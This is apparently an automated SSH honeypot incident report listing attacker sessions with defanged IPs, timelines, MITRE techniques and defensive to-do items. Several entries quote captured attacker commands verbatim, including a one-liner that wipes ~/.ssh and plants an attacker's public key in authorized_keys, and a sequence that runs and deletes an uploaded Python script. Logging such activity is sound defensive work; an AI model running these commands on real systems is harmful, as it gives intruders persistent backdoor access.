**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:57:10` | `cowrie.session.connect` |
| `2026-07-04 07:57:10` | `cowrie.client.version` |
| `2026-07-04 07:57:10` | `cowrie.client.kex` |
| `2026-07-04 07:57:11` | `cowrie.login.success` |
| `2026-07-04 07:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60cdecc0f8bc

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-04 07:57 |
| **Last Seen** | 2026-07-04 07:59 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:57:13` | `cowrie.session.connect` |
| `2026-07-04 07:57:13` | `cowrie.client.version` |
| `2026-07-04 07:57:13` | `cowrie.client.kex` |
| `2026-07-04 07:57:14` | `cowrie.login.success` |
| `2026-07-04 07:57:16` | `cowrie.session.file_upload` |
| `2026-07-04 07:57:17` | `cowrie.session.params` |
| `2026-07-04 07:57:17` | `cowrie.command.input` |
| `2026-07-04 07:57:17` | `cowrie.command.input` |
| `2026-07-04 07:57:17` | `cowrie.command.input` |
| `2026-07-04 07:57:17` | `cowrie.command.failed` |
| `2026-07-04 07:57:17` | `cowrie.log.closed` |
| `2026-07-04 07:57:18` | `cowrie.session.params` |
| `2026-07-04 07:57:18` | `cowrie.command.input` |
| `2026-07-04 07:57:18` | `cowrie.log.closed` |
| `2026-07-04 07:57:19` | `cowrie.session.params` |
| `2026-07-04 07:57:19` | `cowrie.command.input` |
| `2026-07-04 07:57:20` | `cowrie.log.closed` |
| `2026-07-04 07:57:20` | `cowrie.session.params` |
| `2026-07-04 07:57:20` | `cowrie.command.input` |
| `2026-07-04 07:57:20` | `cowrie.command.failed` |
| `2026-07-04 07:57:20` | `cowrie.command.failed` |
| `2026-07-04 07:58:22` | `cowrie.session.params` |
| `2026-07-04 07:58:22` | `cowrie.command.input` |
| `2026-07-04 07:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc9c10c1fb7f

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-04 07:59 |
| **Last Seen** | 2026-07-04 08:01 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:59:22` | `cowrie.session.connect` |
| `2026-07-04 07:59:22` | `cowrie.client.version` |
| `2026-07-04 07:59:22` | `cowrie.client.kex` |
| `2026-07-04 07:59:23` | `cowrie.login.success` |
| `2026-07-04 07:59:25` | `cowrie.session.file_upload` |
| `2026-07-04 07:59:26` | `cowrie.session.params` |
| `2026-07-04 07:59:26` | `cowrie.command.input` |
| `2026-07-04 07:59:26` | `cowrie.command.input` |
| `2026-07-04 07:59:26` | `cowrie.command.input` |
| `2026-07-04 07:59:26` | `cowrie.command.failed` |
| `2026-07-04 07:59:26` | `cowrie.log.closed` |
| `2026-07-04 07:59:27` | `cowrie.session.params` |
| `2026-07-04 07:59:27` | `cowrie.command.input` |
| `2026-07-04 07:59:28` | `cowrie.log.closed` |
| `2026-07-04 07:59:28` | `cowrie.session.params` |
| `2026-07-04 07:59:28` | `cowrie.command.input` |
| `2026-07-04 07:59:29` | `cowrie.log.closed` |
| `2026-07-04 07:59:30` | `cowrie.session.params` |
| `2026-07-04 07:59:30` | `cowrie.command.input` |
| `2026-07-04 07:59:30` | `cowrie.command.failed` |
| `2026-07-04 07:59:30` | `cowrie.command.failed` |
| `2026-07-04 08:00:31` | `cowrie.session.params` |
| `2026-07-04 08:00:31` | `cowrie.command.input` |
| `2026-07-04 08:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e97a8460abb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 08:02 |
| **Last Seen** | 2026-07-04 08:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:02:24` | `cowrie.session.connect` |
| `2026-07-04 08:02:24` | `cowrie.client.version` |
| `2026-07-04 08:02:24` | `cowrie.client.kex` |
| `2026-07-04 08:02:25` | `cowrie.login.success` |
| `2026-07-04 08:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf0a1b32a03

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 08:02 |
| **Last Seen** | 2026-07-04 08:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:02:25` | `cowrie.session.connect` |
| `2026-07-04 08:02:25` | `cowrie.client.version` |
| `2026-07-04 08:02:25` | `cowrie.client.kex` |
| `2026-07-04 08:02:25` | `cowrie.login.success` |
| `2026-07-04 08:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15978af102ba

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 08:02 |
| **Last Seen** | 2026-07-04 08:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:02:35` | `cowrie.session.connect` |
| `2026-07-04 08:02:35` | `cowrie.client.version` |
| `2026-07-04 08:02:35` | `cowrie.client.kex` |
| `2026-07-04 08:02:35` | `cowrie.login.success` |
| `2026-07-04 08:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41485ae29509

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 08:02 |
| **Last Seen** | 2026-07-04 08:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:02:36` | `cowrie.session.connect` |
| `2026-07-04 08:02:36` | `cowrie.client.version` |
| `2026-07-04 08:02:36` | `cowrie.client.kex` |
| `2026-07-04 08:02:36` | `cowrie.login.success` |
| `2026-07-04 08:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23dd96b89a97

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 08:07 |
| **Last Seen** | 2026-07-04 08:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:07:13` | `cowrie.session.connect` |
| `2026-07-04 08:07:14` | `cowrie.client.version` |
| `2026-07-04 08:07:14` | `cowrie.client.kex` |
| `2026-07-04 08:07:21` | `cowrie.login.success` |
| `2026-07-04 08:07:24` | `cowrie.session.params` |
| `2026-07-04 08:07:24` | `cowrie.command.input` |
| `2026-07-04 08:07:26` | `cowrie.log.closed` |
| `2026-07-04 08:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a822525451b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 08:10 |
| **Last Seen** | 2026-07-04 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:10:40` | `cowrie.session.connect` |
| `2026-07-04 08:10:40` | `cowrie.client.version` |
| `2026-07-04 08:10:40` | `cowrie.client.kex` |
| `2026-07-04 08:10:41` | `cowrie.login.success` |
| `2026-07-04 08:10:42` | `cowrie.session.params` |
| `2026-07-04 08:10:42` | `cowrie.command.input` |
| `2026-07-04 08:10:42` | `cowrie.log.closed` |
| `2026-07-04 08:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f48f3fdb3524

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 08:14 |
| **Last Seen** | 2026-07-04 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:14:01` | `cowrie.session.connect` |
| `2026-07-04 08:14:01` | `cowrie.client.version` |
| `2026-07-04 08:14:01` | `cowrie.client.kex` |
| `2026-07-04 08:14:02` | `cowrie.login.success` |
| `2026-07-04 08:14:02` | `cowrie.direct-tcpip.request` |
| `2026-07-04 08:14:02` | `cowrie.direct-tcpip.data` |
| `2026-07-04 08:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c8e5c7babb

| Field | Detail |
|---|---|
| **Source IP** | `114.10.47[.]235` |
| **First Seen** | 2026-07-04 08:16 |
| **Last Seen** | 2026-07-04 08:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:16:50` | `cowrie.session.connect` |
| `2026-07-04 08:16:50` | `cowrie.client.version` |
| `2026-07-04 08:16:50` | `cowrie.client.kex` |
| `2026-07-04 08:16:51` | `cowrie.login.success` |
| `2026-07-04 08:16:53` | `cowrie.session.params` |
| `2026-07-04 08:16:53` | `cowrie.command.input` |
| `2026-07-04 08:16:53` | `cowrie.command.failed` |
| `2026-07-04 08:16:53` | `cowrie.log.closed` |
| `2026-07-04 08:16:54` | `cowrie.session.params` |
| `2026-07-04 08:16:54` | `cowrie.command.input` |
| `2026-07-04 08:16:54` | `cowrie.session.file_download` |
| `2026-07-04 08:16:54` | `cowrie.log.closed` |
| `2026-07-04 08:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.10.47[.]235` to AbuseIPDB if not already reported
- [ ] Block `114.10.47[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6084f8ad9ff

| Field | Detail |
|---|---|
| **Source IP** | `114.10.47[.]235` |
| **First Seen** | 2026-07-04 08:16 |
| **Last Seen** | 2026-07-04 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:16:54` | `cowrie.session.connect` |
| `2026-07-04 08:16:54` | `cowrie.client.version` |
| `2026-07-04 08:16:55` | `cowrie.client.kex` |
| `2026-07-04 08:16:56` | `cowrie.login.success` |
| `2026-07-04 08:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.10.47[.]235` to AbuseIPDB if not already reported
- [ ] Block `114.10.47[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-263517409dde

| Field | Detail |
|---|---|
| **Source IP** | `114.10.47[.]235` |
| **First Seen** | 2026-07-04 08:16 |
| **Last Seen** | 2026-07-04 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:16:56` | `cowrie.session.connect` |
| `2026-07-04 08:16:56` | `cowrie.client.version` |
| `2026-07-04 08:16:57` | `cowrie.client.kex` |
| `2026-07-04 08:16:58` | `cowrie.login.success` |
| `2026-07-04 08:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.10.47[.]235` to AbuseIPDB if not already reported
- [ ] Block `114.10.47[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbddad87c062

| Field | Detail |
|---|---|
| **Source IP** | `20.229.115[.]183` |
| **First Seen** | 2026-07-04 08:17 |
| **Last Seen** | 2026-07-04 08:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:17:39` | `cowrie.session.connect` |
| `2026-07-04 08:17:39` | `cowrie.client.version` |
| `2026-07-04 08:17:39` | `cowrie.client.kex` |
| `2026-07-04 08:17:39` | `cowrie.login.success` |
| `2026-07-04 08:17:40` | `cowrie.session.params` |
| `2026-07-04 08:17:40` | `cowrie.command.input` |
| `2026-07-04 08:17:40` | `cowrie.command.failed` |
| `2026-07-04 08:17:40` | `cowrie.log.closed` |
| `2026-07-04 08:17:41` | `cowrie.session.params` |
| `2026-07-04 08:17:41` | `cowrie.command.input` |
| `2026-07-04 08:17:41` | `cowrie.session.file_download` |
| `2026-07-04 08:17:41` | `cowrie.log.closed` |
| `2026-07-04 08:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.229.115[.]183` to AbuseIPDB if not already reported
- [ ] Block `20.229.115[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb9150a2777

| Field | Detail |
|---|---|
| **Source IP** | `20.229.115[.]183` |
| **First Seen** | 2026-07-04 08:17 |
| **Last Seen** | 2026-07-04 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:17:41` | `cowrie.session.connect` |
| `2026-07-04 08:17:41` | `cowrie.client.version` |
| `2026-07-04 08:17:42` | `cowrie.client.kex` |
| `2026-07-04 08:17:42` | `cowrie.login.success` |
| `2026-07-04 08:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.229.115[.]183` to AbuseIPDB if not already reported
- [ ] Block `20.229.115[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2828af0c8066

| Field | Detail |
|---|---|
| **Source IP** | `20.229.115[.]183` |
| **First Seen** | 2026-07-04 08:17 |
| **Last Seen** | 2026-07-04 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:17:42` | `cowrie.session.connect` |
| `2026-07-04 08:17:42` | `cowrie.client.version` |
| `2026-07-04 08:17:42` | `cowrie.client.kex` |
| `2026-07-04 08:17:43` | `cowrie.login.success` |
| `2026-07-04 08:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.229.115[.]183` to AbuseIPDB if not already reported
- [ ] Block `20.229.115[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f502475f3d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 08:18 |
| **Last Seen** | 2026-07-04 08:19 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:18:54` | `cowrie.session.connect` |
| `2026-07-04 08:18:56` | `cowrie.client.version` |
| `2026-07-04 08:18:56` | `cowrie.client.kex` |
| `2026-07-04 08:19:02` | `cowrie.login.success` |
| `2026-07-04 08:19:05` | `cowrie.session.params` |
| `2026-07-04 08:19:05` | `cowrie.command.input` |
| `2026-07-04 08:19:07` | `cowrie.log.closed` |
| `2026-07-04 08:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d79d58782ff

| Field | Detail |
|---|---|
| **Source IP** | `120.202.189[.]21` |
| **First Seen** | 2026-07-04 08:24 |
| **Last Seen** | 2026-07-04 08:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:24:09` | `cowrie.session.connect` |
| `2026-07-04 08:24:09` | `cowrie.client.version` |
| `2026-07-04 08:24:09` | `cowrie.client.kex` |
| `2026-07-04 08:24:13` | `cowrie.login.success` |
| `2026-07-04 08:24:14` | `cowrie.session.params` |
| `2026-07-04 08:24:14` | `cowrie.command.input` |
| `2026-07-04 08:24:15` | `cowrie.log.closed` |
| `2026-07-04 08:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.202.189[.]21` to AbuseIPDB if not already reported
- [ ] Block `120.202.189[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3ce84e2ebe2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 08:30 |
| **Last Seen** | 2026-07-04 08:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:30:35` | `cowrie.session.connect` |
| `2026-07-04 08:30:36` | `cowrie.client.version` |
| `2026-07-04 08:30:36` | `cowrie.client.kex` |
| `2026-07-04 08:30:42` | `cowrie.login.success` |
| `2026-07-04 08:30:46` | `cowrie.session.params` |
| `2026-07-04 08:30:46` | `cowrie.command.input` |
| `2026-07-04 08:30:47` | `cowrie.log.closed` |
| `2026-07-04 08:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ba1fbb0312

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 08:35 |
| **Last Seen** | 2026-07-04 08:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:35:57` | `cowrie.session.connect` |
| `2026-07-04 08:35:57` | `cowrie.client.version` |
| `2026-07-04 08:35:58` | `cowrie.client.kex` |
| `2026-07-04 08:35:58` | `cowrie.login.success` |
| `2026-07-04 08:35:58` | `cowrie.direct-tcpip.request` |
| `2026-07-04 08:35:58` | `cowrie.direct-tcpip.data` |
| `2026-07-04 08:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3571f8b0ffeb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 08:38 |
| **Last Seen** | 2026-07-04 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:38:01` | `cowrie.session.connect` |
| `2026-07-04 08:38:01` | `cowrie.client.version` |
| `2026-07-04 08:38:01` | `cowrie.client.kex` |
| `2026-07-04 08:38:02` | `cowrie.login.success` |
| `2026-07-04 08:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbad8ec39cee

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 08:38 |
| **Last Seen** | 2026-07-04 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:38:01` | `cowrie.session.connect` |
| `2026-07-04 08:38:01` | `cowrie.client.version` |
| `2026-07-04 08:38:01` | `cowrie.client.kex` |
| `2026-07-04 08:38:02` | `cowrie.login.success` |
| `2026-07-04 08:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74facd55c96e

| Field | Detail |
|---|---|
| **Source IP** | `124.6.178[.]98` |
| **First Seen** | 2026-07-04 08:40 |
| **Last Seen** | 2026-07-04 08:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:40:28` | `cowrie.session.connect` |
| `2026-07-04 08:40:28` | `cowrie.client.version` |
| `2026-07-04 08:40:28` | `cowrie.client.kex` |
| `2026-07-04 08:40:29` | `cowrie.login.success` |
| `2026-07-04 08:40:30` | `cowrie.session.params` |
| `2026-07-04 08:40:30` | `cowrie.command.input` |
| `2026-07-04 08:40:30` | `cowrie.command.failed` |
| `2026-07-04 08:40:31` | `cowrie.log.closed` |
| `2026-07-04 08:40:31` | `cowrie.session.params` |
| `2026-07-04 08:40:31` | `cowrie.command.input` |
| `2026-07-04 08:40:32` | `cowrie.session.file_download` |
| `2026-07-04 08:40:32` | `cowrie.log.closed` |
